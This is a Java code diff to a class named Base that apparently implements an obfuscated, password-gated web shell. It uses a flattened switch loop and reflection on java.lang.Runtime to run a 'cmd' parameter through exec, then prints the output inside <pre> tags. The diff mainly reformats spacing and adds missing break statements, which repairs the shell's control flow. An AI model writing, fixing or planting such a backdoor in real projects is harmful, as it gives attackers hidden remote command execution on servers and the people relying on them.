@@ -8,8 +8,8 @@ import java.lang.reflect.Method;
 public class Base {
     public static void main(String[] args) {
         try {
-            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11","pwd","cmd","java.lang.Runtime",
-                    "getRuntime","exec","<pre>","</pre>"};
+            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11", "pwd", "cmd", "java.lang.Runtime",
+                    "getRuntime", "exec", "<pre>", "</pre>"};
             String temp = globalArr[0];
             String[] b = temp.split("\\|");
             int index = 0;
@@ -34,8 +34,9 @@ public class Base {
                         if (!passwd.equals(PASSWORD)) {
                             return;
                         }
+                        break;
                     case 3:
-                        rt =  Class.forName(globalArr[3]);
+                        rt = Class.forName(globalArr[3]);
                         break;
                     case 4:
                         gr = rt.getMethod(globalArr[4]);
@@ -44,7 +45,7 @@ public class Base {
                         ex = rt.getMethod(globalArr[5], String.class);
                         break;
                     case 6:
-                        process = (Process) ex.invoke(gr.invoke(null),  cmd);
+                        process = (Process) ex.invoke(gr.invoke(null), cmd);
                         break;
                     case 7:
                         in = process.getInputStream();
@@ -62,6 +63,7 @@ public class Base {
                         break;
                     case 11:
                         out.print(globalArr[7]);
+                        break;
                 }
             }
         } catch (Exception ignored) {
